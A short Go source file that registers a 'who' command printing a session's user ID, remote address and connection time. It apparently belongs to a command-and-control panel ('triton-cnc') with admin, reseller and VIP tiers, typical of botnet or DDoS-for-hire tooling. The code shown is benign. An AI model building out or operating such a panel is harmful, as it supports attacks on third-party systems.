package util_Command

import (
	"fmt"
	"strconv"
	"time"
	"triton-cnc/core/sessions/sessions"
)


func init() {

	Register(&Command{
		Name: "who",

		Description: "basic Linux `who` command",

		Admin: false,
		Reseller: false,
		Vip: false,

		Execute: func(Session *sessions.Session_Store, cmd []string) error {

			Session.Channel.Write([]byte(string("\x1b[38;5;15m "+strconv.Itoa(Session.User.ID)+" (\x1b[38;5;11m"+Session.Conn.RemoteAddr().String()+"\x1b[0m)\x1b[38;5;15m "+fmt.Sprintf("%.2f minutes\r\n", time.Since(Session.Creation).Minutes()))))

			return nil
		},
	})
}